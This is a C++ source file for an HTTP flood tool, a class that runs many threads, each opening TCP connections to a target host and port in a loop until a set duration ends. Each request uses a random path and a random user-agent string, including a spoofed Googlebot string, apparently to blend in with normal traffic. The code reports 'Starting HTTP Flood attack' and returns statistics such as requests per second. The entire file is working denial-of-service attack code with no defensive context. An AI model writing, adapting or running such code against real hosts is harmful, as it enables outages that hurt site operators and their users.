#include "http_flood.hpp"
#include "config.hpp"

#include <sstream>
#include <cstring>
#include <algorithm>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
    typedef int socklen_t;
    #define CLOSE_SOCKET closesocket
    #define SOCKET_ERROR_CODE WSAGetLastError()
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <unistd.h>
    #include <fcntl.h>
    #include <errno.h>
    #define SOCKET int
    #define INVALID_SOCKET (-1)
    #define CLOSE_SOCKET close
    #define SOCKET_ERROR_CODE errno
#endif

const std::vector<std::string> HTTPFlood::USER_AGENTS = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
};

const std::vector<std::string> HTTPFlood::PATHS = {
    "/", "/index.html", "/home", "/about", "/contact",
    "/api/v1/data", "/api/v2/users", "/search?q=test",
    "/login", "/register", "/dashboard", "/products",
    "/static/js/main.js", "/static/css/style.css",
    "/images/logo.png", "/favicon.ico", "/robots.txt",
    "/sitemap.xml", "/wp-admin", "/wp-login.php"
};

HTTPFlood::HTTPFlood(const std::string& target, int duration, int threads, int port,
                     std::function<void(const std::string&)> callback)
    : target_(target)
    , duration_(duration)
    , num_threads_(threads)
    , port_(port)
    , callback_(callback)
{
}

HTTPFlood::~HTTPFlood() {
    stop();
}

std::string HTTPFlood::resolve_host(const std::string& hostname) {
    struct addrinfo hints{}, *res = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(hostname.c_str(), nullptr, &hints, &res) != 0 || !res) {
        return "";
    }

    char ip[INET_ADDRSTRLEN];
    auto* addr = reinterpret_cast<struct sockaddr_in*>(res->ai_addr);
    inet_ntop(AF_INET, &addr->sin_addr, ip, sizeof(ip));
    freeaddrinfo(res);
    return std::string(ip);
}

std::string HTTPFlood::get_random_path() {
    thread_local std::mt19937 rng(std::random_device{}());
    std::uniform_int_distribution<size_t> dist(0, PATHS.size() - 1);
    return PATHS[dist(rng)];
}

std::string HTTPFlood::get_random_user_agent() {
    thread_local std::mt19937 rng(std::random_device{}());
    std::uniform_int_distribution<size_t> dist(0, USER_AGENTS.size() - 1);
    return USER_AGENTS[dist(rng)];
}

void HTTPFlood::worker(int /*worker_id*/) {
    std::string ip = resolve_host(target_);
    if (ip.empty()) {
        failed_requests_++;
        return;
    }

    while (!stop_flag_.load()) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            failed_requests_++;
            continue;
        }

        // Set send/recv timeout
#ifdef _WIN32
        DWORD timeout_ms = 5000;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout_ms, sizeof(timeout_ms));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout_ms, sizeof(timeout_ms));
#else
        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
#endif

        struct sockaddr_in server{};
        server.sin_family = AF_INET;
        server.sin_port = htons(static_cast<uint16_t>(port_));
        inet_pton(AF_INET, ip.c_str(), &server.sin_addr);

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
            CLOSE_SOCKET(sock);
            failed_requests_++;
            continue;
        }

        std::string path = get_random_path();
        std::string ua = get_random_user_agent();

        std::ostringstream request;
        request << "GET " << path << " HTTP/1.1\r\n"
                << "Host: " << target_ << "\r\n"
                << "User-Agent: " << ua << "\r\n"
                << "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                << "Accept-Language: en-US,en;q=0.5\r\n"
                << "Accept-Encoding: gzip, deflate\r\n"
                << "Connection: close\r\n"
                << "\r\n";

        std::string req_str = request.str();
        int sent = send(sock, req_str.c_str(), static_cast<int>(req_str.size()), 0);

        if (sent > 0) {
            requests_sent_++;
        } else {
            failed_requests_++;
        }

        CLOSE_SOCKET(sock);
    }
}

std::map<std::string, std::string> HTTPFlood::run() {
    stop_flag_.store(false);
    requests_sent_.store(0);
    failed_requests_.store(0);

    if (callback_) {
        callback_("Starting HTTP Flood attack on " + target_ + ":" + std::to_string(port_));
    }

    auto start_time = std::chrono::steady_clock::now();

    // Launch worker threads
    for (int i = 0; i < num_threads_; i++) {
        threads_.emplace_back(&HTTPFlood::worker, this, i);
    }

    // Monitor duration
    while (!stop_flag_.load()) {
        auto elapsed = std::chrono::steady_clock::now() - start_time;
        if (std::chrono::duration_cast<std::chrono::seconds>(elapsed).count() >= duration_) {
            stop_flag_.store(true);
            break;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    // Join threads
    for (auto& t : threads_) {
        if (t.joinable()) t.join();
    }
    threads_.clear();

    auto end_time = std::chrono::steady_clock::now();
    auto total_seconds = std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time).count();
    if (total_seconds == 0) total_seconds = 1;

    uint64_t sent = requests_sent_.load();
    uint64_t failed = failed_requests_.load();

    std::map<std::string, std::string> stats;
    stats["attack_type"] = "HTTP Flood";
    stats["target"] = target_ + ":" + std::to_string(port_);
    stats["duration"] = std::to_string(total_seconds) + "s";
    stats["threads"] = std::to_string(num_threads_);
    stats["requests_sent"] = std::to_string(sent);
    stats["failed_requests"] = std::to_string(failed);
    stats["requests_per_second"] = std::to_string(sent / static_cast<uint64_t>(total_seconds));

    return stats;
}

void HTTPFlood::stop() {
    stop_flag_.store(true);
    for (auto& t : threads_) {
        if (t.joinable()) t.join();
    }
    threads_.clear();
}
